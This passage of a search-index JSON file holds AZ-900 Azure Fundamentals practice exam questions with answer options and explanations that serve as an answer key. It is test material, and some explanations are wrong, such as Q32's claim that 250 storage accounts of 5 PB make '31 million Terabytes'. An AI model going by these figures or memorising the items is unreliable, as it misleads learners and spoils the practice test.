See:\u00a0https://techcommunity.microsoft.com/t5/security-privacy-and-compliance/announcing-compliance-manager-general-availability/ba-p/161922</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-50-which-of-the-following-is-a-feature-of-the-cool-access-tier-for-azure-storage","title":"Question 50:\u00a0Which of the following is a feature of the cool access tier for Azure Storage?","text":"<ul> <li>Much cheaper to store your files than the hot access tier</li> <li>Most expensive option when it comes to bandwidth cost to access your files</li> <li>Cheapest option when it comes to bandwidth costs to access your files</li> <li>Significant delays in accessing your data, up to several hours</li> </ul> <p>Explanation:  Cool access tier offers cost savings when you expect to store your files and not need to access them often. See:\u00a0https://docs.microsoft.com/en-us/azure/storage/blobs/storage-blob-storage-tiers?tabs=azure-portal</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#test-2","title":"Test 2","text":"","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-1-which-of-the-following-scenarios-would-azure-policy-be-a-recommended-method-for-enforcement","title":"Question 1: Which of the following scenarios would Azure Policy be a recommended method for enforcement?","text":"<ul> <li>Allow only one specific roles of users to have access to a resource group</li> <li>Add an additional prompt when creating a resource without a specific tag to ask the user if they are really sure they want to continue?</li> <li>Prevent certain Azure Virtual Machine instance types from being used in a resource group</li> <li>Require a virtual machine to always update to the latest security patches</li> </ul> <p>Explanation: Azure Policy can add restrictions on storage account SKUs, virtual machine instance types, and rules relating to tagging of resources and groups. It cannot prompt a user to ask them if they are sure. For more info:\u00a0https://docs.microsoft.com/en-us/azure/governance/policy/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-2-select-the-ways-to-increase-the-security-of-a-traditional-user-id-and-password-system","title":"Question 2:\u00a0Select the way(s) to increase the security of a traditional user id and password system?","text":"<ul> <li>Use multi-factor authentication which requires an additional device (something you have) to verify identity.</li> <li>Require longer and more complex passwords.</li> <li>Do not allow users to log into an application except using a company registered device.</li> <li>Require users to change their passwords more frequently.</li> </ul> <p>Explanation: All of these are ways to increase the security on an account. For more info: - https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-password-ban-bad - https://docs.microsoft.com/en-us/azure/active-directory-domain-services/password-policy - https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-sspr-policy</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-3-besides-azure-service-health-where-else-can-you-find-out-any-issues-that-affect-the-azure-global-network-that-affect-you","title":"Question 3:\u00a0Besides Azure Service Health, where else can you find out any issues that affect the Azure global network that affect you?","text":"<ul> <li>Install the Azure app on your phone</li> <li>Azure will email you</li> <li>Azure Updates Blog</li> <li>Each Virtual Machine has a Resource Health blade</li> </ul> <p>Explanation: Each Virtual Machine has a Resource Health blade. For more info:\u00a0https://docs.microsoft.com/en-us/azure/service-health/resource-health-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-4-what-would-be-a-good-reason-to-have-multiple-azure-subscriptions","title":"Question 4:\u00a0What would be a good reason to have multiple Azure subscriptions?","text":"<ul> <li>There is one person/credit card paying for resources, and only one person who logs into Azure to manage the resources, but you want to be able to know which resources are used for which client project.</li> <li>There is one person/credit card paying for resources, but many people who have accounts in Azure, and you need to separate out resources between clients so that there is absolutely no chance of resources being exposed between them.</li> </ul> <p>Explanation: Having multiple subscriptions can technically be done for any reason, but it only makes sense if you have to separate billing directly, or have actual clients logging into the Portal to manage their resources. For more info:\u00a0https://docs.microsoft.com/en-us/microsoft-365/enterprise/subscriptions-licenses-accounts-and-tenants-for-microsoft-cloud-offerings?view=o365-worldwide</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-5-which-of-the-following-is-not-an-example-of-infrastructure-as-a-service","title":"Question 5:\u00a0Which of the following is not an example of Infrastructure as a Service?","text":"<ul> <li>Azure SQL Database </li> <li>SQL Server in a VM</li> <li>Virtual Machine</li> <li>Virtual Machine Scale Sets</li> <li>Virtual Network</li> </ul> <p>Explanation:  With Azure SQL Database, the infrastructure is not in your control. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-sql/azure-sql-iaas-vs-paas-what-is-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-6-which-of-the-following-is-not-a-feature-of-azure-functions","title":"Question 6:\u00a0Which of the following is not a feature of Azure Functions?","text":"<ul> <li>Designed for backend batch applications that are continuously running</li> <li>Can trigger the function based off of Azure events such as a new file being saved to a storage account blob container</li> <li>Can possibly cost you nothing as there is a generous free tier</li> <li>Can edit the code right in the Azure Portal using a code editor</li> </ul> <p>Explanation:  Functions are designed for short pieces of code that start and end quickly. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-functions/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-7-within-the-context-of-privacy-and-compliance-what-does-the-acronym-iso-stand-for-in-english","title":"Question 7: Within the context of privacy and compliance, what does the acronym ISO stand for, in English?","text":"<ul> <li>Information Systems Officer</li> <li>Instead of</li> <li>International Organization for Standardization</li> <li>Intelligence and Security Office</li> </ul> <p>Explanation: ISO is a standards body, International Organization for Standardization. For more info:\u00a0https://www.iso.org/about-us.html</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-8-what-is-the-minimum-charge-for-having-an-azure-account-each-month-even-if-you-dont-use-any-resources","title":"Question 8:\u00a0What is the minimum charge for having an Azure Account each month, even if you don't use any resources?","text":"<ul> <li>$0</li> <li>$200</li> <li>$1</li> <li>Negotiated with your enterprise manager</li> </ul> <p>Explanation: An Azure account can cost nothing if you don't use any resources or only use free resources. For more info:\u00a0https://azure.microsoft.com/en-us/pricing/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-9-what-is-a-benefit-of-economies-of-scale","title":"Question 9: What is a benefit of economies of scale?","text":"<ul> <li>Prices of cloud servers and services are always going down. It'll be cheaper next year than it is this year.</li> <li>Big companies don't need to make a profit on every sale</li> <li>Big companies don't need to make a profit on the first product they sell you, because they will make a profit on the second</li> <li>The more you buy of something, the cheaper it is for you</li> </ul> <p>Explanation: Economies of Scale - the more of an item that you buy, the cheaper it is per unit. For more info:\u00a0https://docs.microsoft.com/en-us/learn/modules/principles-cloud-computing/3b-economies-of-scale</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-10-application-gateway-contains-what-additional-optional-security-feature-over-a-regular-load-balancer","title":"Question 10:\u00a0Application Gateway contains what additional optional security feature over a regular Load Balancer?","text":"<ul> <li>Azure AD Advanced Information Protection    </li> <li>Multi-Factor Authentication    </li> <li>Web Application Firewall (o</li> <li>Advanced DDoS Protection</li> </ul> <p>Explanation: Application Gateways also comes with an optional Web Application Firewall (or WAF) as a security benefit. For more info:\u00a0https://docs.microsoft.com/en-us/azure/web-application-firewall/ag/ag-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-11-approximately-how-many-regions-does-azure-have-around-the-world","title":"Question 11:\u00a0Approximately how many regions does Azure have around the world?","text":"<ul> <li>60+</li> <li>25</li> <li>10</li> <li>40</li> </ul> <p>Explanation:  There are 60+ Azure regions currently, in 10+ geographies. For more info:\u00a0https://docs.microsoft.com/en-us/azure/availability-zones/az-region</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-12-what-does-it-mean-if-a-service-is-in-public-preview-mode","title":"Question 12: What does it mean if a service is in Public Preview mode?","text":"<ul> <li>Anyone can use the service but it must not be for production use</li> <li>Anyone can use the service for any reason</li> <li>The service is generally available for use, and Microsoft will provide support for it</li> <li>You have to apply to get selected in order to use that service</li> </ul> <p>Explanation: Public Preview is for anyone to use, but it is not supported nor guaranteed to continue to be available. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/preview-supplemental-terms/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-13-which-of-the-following-cloud-computing-models-requires-the-highest-level-of-involvement-in-maintaining-the-operating-system-and-file-system-by-the-customer","title":"Question 13:\u00a0Which of the following cloud computing models requires the highest level of involvement in maintaining the operating system and file system by the customer?","text":"<ul> <li>IaaS </li> <li>FaaS</li> <li>PaaS</li> <li>SaaS</li> </ul> <p>Explanation: IaaS or Infrastructure as a service requires you to keep your OS patched, close ports, and generally protect your own server. For more info:\u00a0https://azure.microsoft.com/en-us/overview/what-is-iaas/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-14-true-or-false-azure-cloud-shell-allows-access-to-the-bash-and-powershell-consoles-in-the-azure-portal","title":"Question 14:\u00a0True or false: Azure Cloud Shell allows access to the Bash and Powershell consoles in the Azure Portal","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation:  Cloud Shell - allows access to the Bash and Powershell consoles in the Azure Portal. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cloud-shell/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-15-which-of-the-following-elements-is-considered-part-of-the-perimeter-layer-of-security","title":"Question 15:\u00a0Which of the following elements is considered part of the \"perimeter\" layer of security?","text":"<ul> <li>Separate servers into distinct subnets by role</li> <li>Locks on the data center doors</li> <li>Keep operating systems up to date with patches</li> <li>Use a firewall</li> </ul> <p>Explanation: Firewall is part of the perimeter security. For more information on the layered approach to network security:\u00a0https://docs.microsoft.com/en-us/learn/modules/intro-to-security-in-azure/5-network-security</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-16-what-is-the-concept-of-paired-regions","title":"Question 16:\u00a0What is the concept of paired regions?","text":"<ul> <li>Azure employees in those regions sometimes go on picnics together.</li> <li>Each region of the world has one other region, usually in a completely separate country and geography, where it makes the most sense to place your backups. Like East US 2 is paired with South Korea.</li> <li>When you deploy your code to one region of the world, it is automatically deployed to the paired region as an emergency backup.</li> <li>Each region in the world has at least one other region in which is shares an extremely high speed connection, and where there is coordinated action by Azure not to do anything that will bring them both down at the same time.</li> </ul> <p>Explanation: Paired regions are usually in the same geo (not always) but are the most logical place to store backups because they have a high speed connection and Azure staggers the service updates to those regions. For more info:\u00a0https://docs.microsoft.com/en-us/azure/best-practices-availability-paired-regions</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-17-what-makes-estimating-the-cost-of-an-unmanaged-storage-account-difficult","title":"Question 17:\u00a0What makes estimating the cost of an unmanaged storage account difficult?","text":"<ul> <li>There is no way to predict the amount of data in the account</li> <li>The cost of storage changes frequently</li> <li>You are charged for data leaving Azure, and it's difficult to predict that</li> <li>You are charged for data coming into Azure, and it's difficult to predict that</li> </ul> <p>Explanation:  There is a cost for egress (bandwidth out) and it's hard to estimate how many bytes will be counted leaving an Azure network. For more info:\u00a0https://azure.microsoft.com/en-us/pricing/details/storage/page-blobs/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-18-why-is-a-user-id-and-password-sometimes-not-enough-to-prove-someone-is-who-they-say-they-are","title":"Question 18:\u00a0Why is a user id and password sometimes not enough to prove someone is who they say they are?","text":"<ul> <li>User id and password can be used by anyone such as a co-worker, ex-employee or hacker half-way around the world</li> <li>Some people might choose the same user id and password</li> <li>Passwords must be encrypted before being stored</li> <li>Passwords are usually easy to forget</li> </ul> <p>Explanation: The truth is that someone can find a way to get a user id and password, even guess it, and that can be used by another person. For more information on other ways to prove self-identification such as Multi-Factor Authentication:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-19-which-tool-within-azure-is-comprised-of-azure-status-service-health-and-resource-health","title":"Question 19:\u00a0Which tool within Azure is comprised of : Azure Status, Service Health and Resource Health?","text":"<ul> <li>Azure Dashboard</li> <li>Azure Monitor</li> <li>Azure Service Health</li> <li>Azure Advisor</li> </ul> <p>Explanation: Azure Service Health - lets you know about any Azure-related service issues including region-wide downtime. For more info:\u00a0https://docs.microsoft.com/en-us/azure/service-health/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-20-which-of-the-following-is-a-good-example-of-a-hybrid-cloud","title":"Question 20:\u00a0Which of the following is a good example of a Hybrid cloud?","text":"<ul> <li>Your users are inside your corporate network but your applications and data are in the cloud.</li> <li>Your code is a mobile app that runs on iOS and Android phones, but it uses a database in the cloud.</li> <li>A server runs in your own environment, but places files in the cloud so that it can extend the amount of storage it has access to.</li> <li>Technology that allows you to grow living tissue on top of an exoskeleton, making Terminators impossible to spot among humans.</li> </ul> <p>Explanation: Hybrid Cloud - A mixture between your own private networks and servers, and using the public cloud for some things. Typically used to take advantage of the unlimited, inexpensive growth benefits of the public cloud. For more info:\u00a0https://azure.microsoft.com/en-us/overview/what-is-hybrid-cloud-computing/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-21-where-do-you-go-within-the-azure-portal-to-find-all-of-the-third-party-virtual-machine-and-other-offers","title":"Question 21:\u00a0Where do you go within the Azure Portal to find all of the third-party virtual machine and other offers?","text":"<ul> <li>Azure mobile app</li> <li>Azure Marketplace</li> <li>Choose an image when creating a VM</li> <li>Bing</li> </ul> <p>Explanation:  Azure Marketplace contains thousands of services you can rent within the cloud. For more info:\u00a0https://azuremarketplace.microsoft.com/en-us</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-22-what-is-the-new-data-privacy-and-information-protection-regulation-that-took-effect-across-europe-in-may-2018","title":"Question 22:\u00a0What is the new data privacy and information protection regulation that took effect across Europe in May 2018?","text":"<ul> <li>FedRAMP</li> <li>GDPR</li> <li>ISO 9001:2015</li> <li>PCI DSS</li> </ul> <p>Explanation: The General Data Protection Regulation (GDPR) took effect in Europe in May 2018. For more info:\u00a0https://docs.microsoft.com/en-us/microsoft-365/compliance/gdpr?view=o365-worldwide</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-23-why-is-azure-app-services-considered-platform-as-a-service","title":"Question 23:\u00a0Why is Azure App Services considered Platform as a Service?","text":"<ul> <li>You can decide on what type of virtual machine it runs - A-series, or D-series, or even H-series</li> <li>You are responsible for keeping the operating system up to date with the latest patches</li> <li>Azure App Services is not PaaS, it's Software as a Service.</li> <li>You give Azure the code and configuration, and you have no access to the underlying hardware</li> </ul> <p>Explanation: You give Azure the code and configuration, and you have no access to the underlying hardware. For more info:\u00a0https://docs.microsoft.com/en-us/azure/app-service/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-24-what-two-types-of-ddos-protection-services-does-azure-provide-select-two","title":"Question 24: What two types of DDoS protection services does Azure provide? Select two.","text":"<ul> <li>DDoS\u00a0Premium Protection</li> <li>DDoS\u00a0Advanced Protection</li> <li>DDoS Network Protection</li> <li>DDoS IP Protection</li> </ul> <p>Explanation:  Azure DDoS Protection offers two types of DDoS protection services:</p> <ul> <li> <p>Network Protection\u00a0protects against volumetric attacks that target the network infrastructure. This type of protection is available for all Azure resources that are deployed in a virtual network.</p> </li> <li> <p>IP Protection\u00a0protects against volumetric and protocol-based attacks that target specific public IP addresses. This type of protection is available for public IP addresses that are not deployed in a virtual network.</p> </li> </ul> <p>For more info:\u00a0https://docs.microsoft.com/en-us/azure/virtual-network/ddos-protection-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-25-what-types-of-files-can-a-content-delivery-network-speed-up-the-delivery-of","title":"Question 25:\u00a0What types of files can a Content Delivery Network speed up the delivery of?","text":"<ul> <li>PDFs</li> <li>Videos</li> <li>Images</li> <li>JavaScript files</li> </ul> <p>Explanation: All of them. Any static file that doesn't change. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cdn/cdn-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-26-what-is-the-concept-of-big-data","title":"Question 26:\u00a0What is the concept of Big Data?","text":"<ul> <li>A set of Azure services that allow you to use execute code in the cloud but don\u2019t require (or even allow) you to manage the underlying server</li> <li>A form of artificial intelligence (AI) that allows systems to automatically learn and improve from experience without being explicitly programmed.</li> <li>A small sensor or other device that constantly sends it's status and other data to the cloud</li> <li>An extremely large set of data that you want to ingest and do analysis on; traditional software like SQL Server cannot handle Big Data as efficiently as specialized products</li> </ul> <p>Explanation: Big Data - a set of open source (Apache Hadoop) products that can do analysis on millions and billions of rows of data; current tools like SQL Server are not good for this scale</p> <p>For more info:\u00a0https://docs.microsoft.com/en-us/azure/architecture/guide/architecture-styles/big-data</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-27-select-all-features-part-of-azure-ad","title":"Question 27:\u00a0Select all features part of Azure AD?","text":"<ul> <li>Device Management</li> <li>Log Alert Rule</li> <li>Single sign-on </li> <li>Smart lockout</li> <li>Custom banned password list</li> </ul> <p>Explanation: The Log Alert Rule is not a feature of Azure AD. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis#which-features-work-in-azure-ad</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-28-in-which-us-state-is-the-east-us-2-region","title":"Question 28:\u00a0In which US state is the East US 2 region?","text":"<ul> <li>Iowa</li> <li>Virginia</li> <li>Texas</li> <li>California</li> </ul> <p>Explanation: East US 2 is in the Eastern state of Virginia, close to Washington DC. For more info:\u00a0https://azure.microsoft.com/en-us/global-infrastructure/data-residency/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-29-windows-servers-use-remote-desktop-protocol-rdp-in-order-for-administrators-to-get-access-to-manage-the-server-linux-servers-use-ssh-what-is-the-recommendation-for-ensuring-the-security-of-these-protocols","title":"Question 29:\u00a0Windows servers use \"remote desktop protocol\" (RDP) in order for administrators to get access to manage the server. Linux servers use SSH. What is the recommendation for ensuring the security of these protocols?","text":"<ul> <li>Disable RDP access using the Windows Services control panel admin tool</li> <li>Ensure strong passwords on your Windows admin accounts</li> <li>Do not enable SSH access for Linux servers</li> <li>Do not allow public Internet access over the RDP and SSH ports directly to the server. Instead use a secure server like Bastion to control access to the servers behind.</li> </ul> <p>Explanation: You need to either control access to the RDP and SSH ports to a very specific range of IPs, enable the ports only when you are using it, or use a Bastion server/jump box to protect those servers. For more info:\u00a0https://docs.microsoft.com/en-us/azure/bastion/bastion-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-30-what-does-arm-stand-for-in-azure","title":"Question 30:\u00a0What does ARM stand for in Azure?","text":"<ul> <li>Account Resource Manager    </li> <li>Availability, Reliability, Maintainability  </li> <li>Advanced RISC Machine    </li> <li>Azure Resource Manager</li> </ul> <p>Explanation: Azure Resource Manager (ARM) - this is the common resource deployment model that underlies all resource creation or modification; no matter whether you use the portal, powershell or the SDK, the Azure Resource Manager takes those commands and executes them. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-31-in-what-way-does-multi-factor-authentication-increase-the-security-of-a-user-account","title":"Question 31:\u00a0In what way does Multi-Factor Authentication increase the security of a user account?","text":"<ul> <li>It requires the user to possess something like their phone to read an SMS, use a mobile app, or biometric identification.</li> <li>It requires single sign-on functionality</li> <li>It doesn't. Multi-Factor Authentication is more about access and authentication than account security.</li> <li>It requires users to be approved before they can log in for the first time.</li> </ul> <p>Explanation: MFA requires that the user have access to their mobile phone for using SMS or an app. For more info:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-32-what-is-the-maximum-amount-of-azure-storage-space-a-single-subscription-can-store","title":"Question 32:\u00a0What is the maximum amount of Azure Storage space a single subscription can store?","text":"<ul> <li>500 GB</li> <li>Virtually unlimited</li> <li>5 PB</li> <li>2 TB</li> </ul> <p>Explanation: A single Azure subscription can have up to 250 storage accounts per region, and each storage account can store up to 5 Petabytes. That is 31 million Terabytes. This is probably 15-20 times what Google, Amazon, Microsoft and Facebook use combined. That's a lot. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/azure-subscription-service-limits#storage-limits</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-33-how-do-you-get-access-to-services-in-private-preview-mode","title":"Question 33:\u00a0How do you get access to services in Private Preview mode?","text":"<ul> <li>You cannot use private preview services.</li> <li>They are available in the marketplace. You simply use them.</li> <li>You must apply to use them.</li> <li>You must agree to a terms of use first.</li> </ul> <p>Explanation: Private Preview means you must apply to use them. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/preview-supplemental-terms/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-34-what-is-the-concept-of-being-able-to-get-your-applications-and-data-running-in-another-environment-quickly","title":"Question 34:\u00a0What is the concept of being able to get your applications and data running in another environment quickly?","text":"<ul> <li>Business Continuity / Disaster Recovery (BC/DR)</li> <li>Azure Blueprint</li> <li>Azure Devops</li> <li>Reproducible deployments</li> </ul> <p>Explanation: Disaster Recovery - the ability to recover from a big failure within an acceptable period of time, with an acceptable amount of data lost. For more info on Backup and Disaster Recovery:\u00a0https://azure.microsoft.com/en-us/solutions/backup-and-disaster-recovery/ For more info on Azure\u2019s built-in disaster recovery as a service (DRaaS):\u00a0https://azure.microsoft.com/en-us/services/site-recovery/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-35-which-of-the-following-is-considered-a-downside-to-using-capital-expenditure-capex","title":"Question 35:\u00a0Which of the following is considered a downside to using Capital Expenditure (CapEx)?","text":"<ul> <li>It does not require a lot of up front money</li> <li>You can deduct expenses as they occur</li> <li>You are not guaranteed to make a profit    </li> <li>You must wait over a period of years to depreciate that investment on your taxes</li> </ul> <p>Explanation: One of the downsides of CapEx is that the money invested cannot be deducted immediately from your taxes. For more info:\u00a0https://docs.microsoft.com/en-us/learn/modules/principles-cloud-computing/3c-capex-vs-opex</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-36-what-azure-resource-allows-you-to-evenly-split-traffic-coming-in-and-direct-it-to-several-identical-virtual-machines-to-do-the-work-and-respond-to-the-request","title":"Question 36:\u00a0What Azure resource allows you to evenly split traffic coming in and direct it to several identical virtual machines to do the work and respond to the request?","text":"<ul> <li>Load Balancer or Application Gateway  </li> <li>Azure Logic Apps</li> <li>Virtual Network</li> <li>Azure App Services</li> </ul> <p>Explanation: This is the core feature of either a Load Balancer or Application Gateway. For more info:\u00a0https://docs.microsoft.com/en-us/azure/load-balancer/load-balancer-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-37-true-or-false-azure-charges-for-bandwidth-used-inbound-to-azure","title":"Question 37:\u00a0True or false: Azure charges for bandwidth used \"inbound\" to Azure","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation:  Ingress bandwidth is free. You pay for egress (outbound). For more info:\u00a0https://azure.microsoft.com/en-us/pricing/details/bandwidth/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-38-which-free-azure-security-service-checks-all-traffic-travelling-over-a-subnet-against-a-set-of-rules-before-allowing-it-in-or-out","title":"Question 38:\u00a0Which free Azure security service checks all traffic travelling over a subnet against a set of rules before allowing it in, or out.","text":"<ul> <li>Network Security Group</li> <li>Advanced Threat Protection (ARP)</li> <li>Azure Firewall</li> <li>Azure DDoS Protection</li> </ul> <p>Explanation:  Network Security Group (NSG) - a fairly basic set of rules that you can apply to both inbound traffic and outbound traffic that lets you specify what sources, destinations and ports are allowed to travel through from outside the virtual network to inside the virtual network. For more info:\u00a0https://docs.microsoft.com/en-us/azure/virtual-network/security-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-39-what-is-the-concept-of-availability","title":"Question 39:\u00a0What is the concept of Availability?","text":"<ul> <li>A system must have 100% uptime to be considered available</li> <li>A system that can scale up and scale down depending on customer demand</li> <li>The percentage of time a system responds properly to requests, expressed as a percentage over time    </li> <li>A system that has a single point of failure</li> </ul> <p>Explanation: Availability - what percentage of time does a system respond properly to requests, expressed as a percentage over time. For more information on region and availability zones see:\u00a0https://docs.microsoft.com/en-us/azure/availability-zones/az-overview. For more information on availability options for virtual machines see:\u00a0https://docs.microsoft.com/en-us/azure/virtual-machines/availability. </p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-40-what-is-the-benefit-of-using-powershell-over-cli","title":"Question 40:\u00a0What is the benefit of using Powershell over CLI?","text":"<ul> <li>More powerful commands</li> <li>Quicker to deploy VMs</li> <li>Cheaper</li> <li>No benefit, it's the same</li> </ul> <p>Explanation: There is no benefit, only a matter of personal choice. For more info on Azure CLI:\u00a0https://docs.microsoft.com/en-us/cli/azure/what-is-azure-cli?view=azure-cli-latest. For more info on Azure Powershell:\u00a0https://docs.microsoft.com/en-us/powershell/azure/?view=azps-4.5.0</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-41-how-many-regions-does-azure-have-in-brazil","title":"Question 41:\u00a0How many regions does Azure have in Brazil?","text":"<ul> <li>2</li> <li>0</li> <li>1</li> <li>4</li> </ul> <p>Explanation: There is 1 region in Brazil. For more info:\u00a0https://azure.microsoft.com/en-us/global-infrastructure/geographies/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-42-what-azure-product-allows-you-to-autoscale-virtual-machines-from-1-to-1000-instances-and-also-provides-load-balancing-services-built-in","title":"Question 42:\u00a0What Azure product allows you to autoscale virtual machines from 1 to 1000 instances, and also provides load balancing services built in?","text":"<ul> <li>Virtual Machine Scale Sets</li> <li>Azure App Services</li> <li>Azure Virtual Machines</li> <li>Application Gateway</li> </ul> <p>Explanation:  Virtual Machine Scale Sets - these are a set of identical virtual machines (from 1 to 1000 instances) that are designed to auto-scale up and down based on user demand. For more info:\u00a0https://azure.microsoft.com/en-us/services/virtual-machine-scale-sets/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-43-what-does-it-mean-if-a-service-is-in-general-availability-ga-mode","title":"Question 43: What does it mean if a service is in General Availability (GA) mode?","text":"<ul> <li>Anyone can use the service for any reason    </li> <li>You have to apply to get selected in order to use that service</li> <li>Anyone can use the service but it must not be for production use</li> <li>The service has now reached public preview, and Microsoft will provide support for it</li> </ul> <p>Explanation: Anyone can use a GA service. It is fully supported and can be used for production. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/preview-supplemental-terms/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-44-each-person-has-their-own-user-id-and-password-to-log-into-azure-but-how-many-subscriptions-can-a-single-account-be-associated-with","title":"Question 44:\u00a0Each person has their own user id and password to log into Azure. But how many subscriptions can a single account be associated with?","text":"<ul> <li>10</li> <li>250 per region</li> <li>No limit</li> <li>One</li> </ul> <p>Explanation:  There is not a limit to the number of subscriptions a single user can be included on.</p> <p>For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/azure-subscription-service-limits</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-45-what-is-the-azure-sla-for-two-or-more-virtual-machines-in-an-availability-set","title":"Question 45:\u00a0What is the Azure SLA for two or more Virtual Machines in an Availability Set?","text":"<ul> <li>100%</li> <li>99.90%</li> <li>99.99%</li> <li>99.95%</li> </ul> <p>Explanation: 99.95% For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/sla/virtual-machines/v1_9/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-46-which-azure-service-is-the-recommended-identity-as-a-service-offering-inside-azure","title":"Question 46:\u00a0Which Azure service is the recommended Identity-as-a-Service offering inside Azure?","text":"<ul> <li>Azure Active Directory (AD)</li> <li>Azure Portal</li> <li>Identity and Access Management (IAM)</li> <li>Azure Front Door</li> </ul> <p>Explanation:  Azure AD is the identity service designed for web protocols, that you can use for your applications. For more info:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-47-what-is-the-benefit-of-using-a-command-line-tool-like-powershell-or-cli-as-opposed-to-the-azure-portal","title":"Question 47:\u00a0What is the benefit of using a command line tool like Powershell or CLI as opposed to the Azure portal?","text":"<ul> <li>Quicker to deploy VMs</li> <li>Cheaper</li> <li>Automation</li> </ul> <p>Explanation: The real benefit is automation. Being able to write a script to do something is better than having to do it manually each time. For more info on Azure CLI:\u00a0https://docs.microsoft.com/en-us/cli/azure/what-is-azure-cli?view=azure-cli-latest. For more info on Azure 